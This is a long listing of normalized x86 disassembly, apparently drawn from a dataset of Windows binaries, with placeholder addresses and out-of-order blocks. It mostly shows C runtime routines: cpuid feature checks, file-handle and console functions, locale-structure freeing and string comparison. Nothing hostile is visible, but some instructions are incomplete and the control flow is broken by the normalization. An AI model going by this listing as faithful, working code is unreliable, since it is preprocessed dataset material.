push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4093b5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4093d4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4093ac
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4093b5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4093d7
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x1c
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ rw-data ] ebx
xor eax eax
cpuid
push esi
mov esi [ rw-data ]
push edi
lea edi [ ebp - 0x1c ]
or esi 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
xor ecx 0x49656e69
mov eax [ ebp - 0x14 ]
xor eax 0x6c65746e
mov [ rw-data ] esi
or ecx eax
mov eax [ ebp - 0x18 ]
xor eax 0x756e6547
or ecx eax
neg ecx
push 0x1
sbb cl cl
pop eax
inc cl
push 0x0
pop ecx
cpuid
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
je r-xdata
mov edi [ rw-data ]
mov eax [ ebp - 0x1c ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
xor eax eax
push 0x7
xor ecx ecx
lea esi [ ebp - 0x1c ]
pop eax
cpuid
mov [ esi ] eax
mov eax esi
mov esi [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x18 ]
test eax 0x200
je r-xdata
mov edi [ rw-data ]
or edi 0x1
mov [ rw-data ] edi
jmp r-xdata
cmp eax 0x20660
je r-xdata
pop edi
pop esi
or esi 0x4
mov [ rw-data ] 0x2
mov [ rw-data ] esi
test ecx 0x8000000
je r-xdata
test ecx 0x100000
je r-xdata
or edi 0x2
mov [ rw-data ] edi
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jl r-xdata
cmp eax 0x20670
je r-xdata
test ecx 0x10000000
je r-xdata
cmp eax 0x30650
je r-xdata
or esi 0x8
mov [ rw-data ] 0x3
mov [ rw-data ] esi
test al 0x20
je r-xdata
cmp eax 0x30660
je r-xdata
or esi 0x20
mov [ rw-data ] 0x5
mov [ rw-data ] esi
cmp eax 0x30670
jne r-xdata
sub_409550
push 0x8
push r--data
call sub_4021d0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_402215
retn
push 0xa
call sub_402c45
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4095d5
push ebx
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_402e65
add esp 0xc
inc [ esi + 0x8 ]
sub_4095de
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_4028a5
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
mov esi eax
sar edi 0x5
and esi 0x1f
shl esi 0x6
mov ecx [ edi * 4 + rw-data ]
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_409664
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_4028a5
and [ eax ] 0x0
call sub_4028d9
mov [ eax ] 0x9
jmp r-xdata
call sub_4028a5
and [ eax ] 0x0
call sub_4028d9
mov [ eax ] 0x9
call sub_402521
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_4096cb
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
add ecx 0xc
mov eax [ eax * 4 + rw-data ]
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4096f1
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_40a02f
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_409740
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40976b
push 0x14
push r--data
call sub_4021d0
xor esi esi
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_4028d9
mov [ eax ] 0x9
jmp r-xdata
call sub_4028d9
mov [ eax ] 0x9
call sub_402521
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_409550
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_4028d9
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_409664
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_402215
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409833
mov eax esi
jmp r-xdata
call sub_4028a5
mov [ eax ] esi
sub_40991c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
push eax
call sub_402bcd
pop ecx
sub_409a18
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_402bcd
pop ecx
push eax
call sub_402bcd
pop ecx
sub_409a7f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_402bcd
push [ esi + 0x8 ]
call sub_402bcd
push [ esi + 0xc ]
call sub_402bcd
push [ esi + 0x10 ]
call sub_402bcd
push [ esi + 0x14 ]
call sub_402bcd
push [ esi + 0x18 ]
call sub_402bcd
push [ esi ]
call sub_402bcd
push [ esi + 0x20 ]
call sub_402bcd
push [ esi + 0x24 ]
call sub_402bcd
push [ esi + 0x28 ]
call sub_402bcd
push [ esi + 0x2c ]
call sub_402bcd
push [ esi + 0x30 ]
call sub_402bcd
push [ esi + 0x34 ]
call sub_402bcd
push [ esi + 0x1c ]
call sub_402bcd
push [ esi + 0x38 ]
call sub_402bcd
push [ esi + 0x3c ]
call sub_402bcd
add esp 0x40
push [ esi + 0x40 ]
call sub_402bcd
push [ esi + 0x44 ]
call sub_402bcd
push [ esi + 0x48 ]
call sub_402bcd
push [ esi + 0x4c ]
call sub_402bcd
push [ esi + 0x50 ]
call sub_402bcd
push [ esi + 0x54 ]
call sub_402bcd
push [ esi + 0x58 ]
call sub_402bcd
push [ esi + 0x5c ]
call sub_402bcd
push [ esi + 0x60 ]
call sub_402bcd
push [ esi + 0x64 ]
call sub_402bcd
push [ esi + 0x68 ]
call sub_402bcd
push [ esi + 0x6c ]
call sub_402bcd
push [ esi + 0x70 ]
call sub_402bcd
push [ esi + 0x74 ]
call sub_402bcd
push [ esi + 0x78 ]
call sub_402bcd
push [ esi + 0x7c ]
call sub_402bcd
add esp 0x40
push [ esi + 0x80 ]
call sub_402bcd
push [ esi + 0x84 ]
call sub_402bcd
push [ esi + 0x88 ]
call sub_402bcd
push [ esi + 0x8c ]
call sub_402bcd
push [ esi + 0x90 ]
call sub_402bcd
push [ esi + 0x94 ]
call sub_402bcd
push [ esi + 0x98 ]
call sub_402bcd
push [ esi + 0x9c ]
call sub_402bcd
push [ esi + 0xa0 ]
call sub_402bcd
push [ esi + 0xa4 ]
call sub_402bcd
push [ esi + 0xa8 ]
call sub_402bcd
push [ esi + 0xb8 ]
call sub_402bcd
push [ esi + 0xbc ]
call sub_402bcd
push [ esi + 0xc0 ]
call sub_402bcd
push [ esi + 0xc4 ]
call sub_402bcd
push [ esi + 0xc8 ]
call sub_402bcd
add esp 0x40
push [ esi + 0xcc ]
call sub_402bcd
push [ esi + 0xb4 ]
call sub_402bcd
push [ esi + 0xd4 ]
call sub_402bcd
push [ esi + 0xd8 ]
call sub_402bcd
push [ esi + 0xdc ]
call sub_402bcd
push [ esi + 0xe0 ]
call sub_402bcd
push [ esi + 0xe4 ]
call sub_402bcd
push [ esi + 0xe8 ]
call sub_402bcd
push [ esi + 0xd0 ]
call sub_402bcd
push [ esi + 0xec ]
call sub_402bcd
push [ esi + 0xf0 ]
call sub_402bcd
push [ esi + 0xf4 ]
call sub_402bcd
push [ esi + 0xf8 ]
call sub_402bcd
push [ esi + 0xfc ]
call sub_402bcd
push [ esi + 0x100 ]
call sub_402bcd
push [ esi + 0x104 ]
call sub_402bcd
add esp 0x40
push [ esi + 0x108 ]
call sub_402bcd
push [ esi + 0x10c ]
call sub_402bcd
push [ esi + 0x110 ]
call sub_402bcd
push [ esi + 0x114 ]
call sub_402bcd
push [ esi + 0x118 ]
call sub_402bcd
push [ esi + 0x11c ]
call sub_402bcd
push [ esi + 0x120 ]
call sub_402bcd
push [ esi + 0x124 ]
call sub_402bcd
push [ esi + 0x128 ]
call sub_402bcd
push [ esi + 0x12c ]
call sub_402bcd
push [ esi + 0x130 ]
call sub_402bcd
push [ esi + 0x134 ]
call sub_402bcd
push [ esi + 0x138 ]
call sub_402bcd
push [ esi + 0x13c ]
call sub_402bcd
push [ esi + 0x140 ]
call sub_402bcd
push [ esi + 0x144 ]
call sub_402bcd
add esp 0x40
push [ esi + 0x148 ]
call sub_402bcd
push [ esi + 0x14c ]
call sub_402bcd
push [ esi + 0x150 ]
call sub_402bcd
push [ esi + 0x154 ]
call sub_402bcd
push [ esi + 0x158 ]
call sub_402bcd
push [ esi + 0x15c ]
call sub_402bcd
push [ esi + 0x160 ]
call sub_402bcd
add esp 0x1c
sub_409dff
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_404f52
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_4028d9
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_4028d9
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
mov [ esi + 0x4 ] ebx
or eax 0x2
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_4040b2
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push 0x2
push eax
push edi
mov [ ebp + 0xc ] 0x2
call sub_4055c4
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
sub ecx edx
mov [ ebp + 0xc ] ecx
lea eax [ edx + 0x2 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub eax 0x2
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_407040
pop ecx
test eax eax
jne r-xdata
call sub_4040b2
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax cx
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_4055c4
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_407203
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_407094
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_409fa0
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
cmove ebx eax
inc edx
sub ebx 0x1
jbe r-xdata
sub ebx 0x4
jbe r-xdata
test dl 0x3
jne r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
sub_40a04e
push 0x8
push r--data
call sub_4021d0
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_402215
retn
push 0xc
call sub_402c45
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_40826f
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a097
sub_40a0a0
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_40281d
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp + 0x8 ] eax
push ecx
movzx eax al
push eax
call sub_4082ba
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_409080
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40a160
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40a1c1
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_40281d
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_4028d9
xor ecx ecx
inc ecx
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp + 0x8 ] eax
push ecx
movzx eax al
push eax
call sub_4082ba
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_40a0a0
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x8 ]
push 0x1
push [ eax + 0x4 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_408f42
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40a304
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40a1c1
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_40a330
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
call sub_40281d
lea eax [ ebp - 0x2c ]
xor edi edi
push eax
push edi
push edi
push edi
push edi
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40b014
mov ebx eax
add esp 0x20
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40aaa2
pop ecx
pop ecx
test bl 0x3
jne r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] ecx
test bl 0x1
jne r-xdata
cmp eax 0x1
je r-xdata
push 0x4
jmp r-xdata
test bl 0x2
je r-xdata
push 0x3
cmp eax 0x2
jne r-xdata
pop edi
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40a3d4
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x28 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
call sub_40281d
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
push ebx
push ebx
push ebx
push ebx
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40b014
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_40a530
mov ecx eax
add esp 0x28
mov eax [ ebp - 0x14 ]
test al 0x3
jne r-xdata
test al 0x1
jne r-xdata
cmp ecx 0x1
je r-xdata
push 0x4
jmp r-xdata
test al 0x2
je r-xdata
push 0x3
cmp ecx 0x2
jne r-xdata
pop ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40a480
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40a530
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx eax [ ecx + 0xa ]
xor ebx ebx
mov edi [ ebp + 0xc ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] eax
and edx 0x7fff
mov eax [ ecx + 0x6 ]
sub edx 0x3fff
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
shl eax 0x10
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] edx
movsd [ edi ] [ esi ]
dec eax
mov [ ebp - 0x34 ] eax
push 0x1f
mov [ ebp - 0x2c ] ebx
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov eax ecx
cdq
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov [ ebp - 0x30 ] esi
mov ecx esi
or edi 0xffffffff
shl eax cl
push 0x3
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
